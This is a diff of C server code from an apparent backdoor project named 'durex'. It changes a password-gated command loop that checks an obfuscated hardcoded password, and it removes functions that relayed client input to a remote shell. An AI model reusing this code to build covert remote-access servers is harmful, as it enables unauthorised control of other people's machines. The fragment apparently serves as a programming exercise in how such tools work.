@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
-/*   Updated: 2018/08/21 09:50:47 by root             ###   ########.fr       */
+/*   Updated: 2018/08/26 23:29:58 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,6 +17,7 @@
 /* inet_ntop */
 #include <arpa/inet.h>
 							#include <stdio.h>
+							#include <errno.h>
 #include "main.h"
 #include "durex.h"
 
@@ -114,7 +115,7 @@ static int			myustrcmp(u_char *s1, u_char *s2)
 static void			serverLogging(u_char *buff, int size, t_cl *client)
 {
 	mymemset(buff + size, 0, SERVER_CLIENT_BUFF - size);
-	encrypt(buff, size);
+	encryptFunction(buff, size);
 	//kata (4): 201 121 30 74
 	if (myustrcmp(buff, (u_char []){ 201, 121, 30, 74, 0 }) == 3) {
 		client->logged = 1;
@@ -124,29 +125,31 @@ static void			serverLogging(u_char *buff, int size, t_cl *client)
 	}
 }
 
-static void			serverCommands(char *buff, t_cl *client)
+void				serverCommands(t_cl *client)
 {
+	char			buff[SERVER_CLIENT_BUFF];
+	size_t			i;
 	static t_cmd	cmds[] = { SERVER_COMMANDS };
 
-	for (size_t i = 0; i < sizeof(cmds) / sizeof(*cmds); i++) {
-		int ret = mystrcmp(buff, cmds[i].name);
-		if (ret == 0 || ret == ' ') {
-			cmds[i].func(client, cmds);
-			break ;
+	/* Here we recreate the client read buffer to get a non truncated string */
+	i = 0;
+	while (client->rd.tail != client->rd.head) {
+		buff[i] = *client->rd.tail;
+		client->rd.tail = moveTail(client->rd.tail, client->rd.buff, SERVER_CLIENT_BUFF);
+		i++;
+	}
+	buff[i] = '\0';
+	if (!client->logged) {
+		return serverLogging((u_char *)buff, i, client);
+	} else {
+		for (i = 0; i < sizeof(cmds) / sizeof(*cmds); i++) {
+			int ret = mystrcmp(buff, cmds[i].name);
+			if (ret == 0 || ret == ' ') {
+				return cmds[i].func(client, cmds);
+			}
 		}
 	}
-}
-
-static void			serverWriteShell(char *buff, int len, t_cl *client)
-{
-	int				ret;
-
-	serverLog("[SHEL] writing: %s", buff);
-	ret = write(client->shell[0], buff, len);
-	if (ret <= 0) {
-		serverQuitClientShell(client);
-		clientWrite("$> ", client);
-	}
+	clientWrite("$> ", client);
 }
 
 void				serverReadClient(t_cl *client)
@@ -159,24 +162,6 @@ void				serverReadClient(t_cl *client)
 		return serverQuitClient(client, NULL);
 	buff[ret] = '\0';
 	clientRead(buff, ret, client);
-	/* Here we recreate the client rd buff to get a non truncated string */
-	char *ptr = client->rd.tail;
-	ret = 0;
-	while (ptr != client->rd.head) {
-		buff[ret++] = *ptr;
-		if (*ptr == '\n') {
-			buff[ret - 1] = '\0';
-			if (!client->logged)
-				serverLogging((u_char *)buff, ret - 1, client);
-			else if (client->shell[0] != -1)
-				serverWriteShell(buff, ret - 1, client);
-			else
-				serverCommands(buff, client);
-			ret = 0;
-			client->rd.tail = moveTail(ptr, client->rd.buff, SERVER_CLIENT_BUFF);
-		}
-		ptr = moveTail(ptr, client->rd.buff, SERVER_CLIENT_BUFF);
-	}
 }
 
 void				serverWriteClient(t_cl *client)
@@ -196,30 +181,19 @@ void				serverWriteClient(t_cl *client)
 	}
 }
 
-void				serverReadClientShell(t_cl *client)
-{
-	char			buff[SERVER_CLIENT_BUFF];
-	int				ret;
-
-	ret = read(client->shell[0], buff, SERVER_CLIENT_BUFF);
-	if (ret <= 0)
-		return serverQuitClientShell(client);
-	buff[ret] = '\0';
-	serverLog("[SHEL] received: %s", buff);
-	clientWrite(buff, client);
-}
-
 void				quitClearlyServer()
 {
-	serverLog("[LOG] - Leaving server...");
 	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
 	{
-		if (e.server.client[i].fd != -1)
-			close(e.server.client[i].fd);
+		serverQuitClient(&e.server.client[i], NULL);
 		clearClient(&e.server.client[i]);
 	}
-	if (e.server.fd != -1)
+	if (e.server.fd != -1) {
+		serverLog("[LOG] - Closing server...");
 		close(e.server.fd);
-	if (e.server.reporter != -1)
+	}
+	if (e.server.reporter != -1) {
+		serverLog("[LOG] - Firing reporter...");		
 		close(e.server.reporter);
+	}
 }
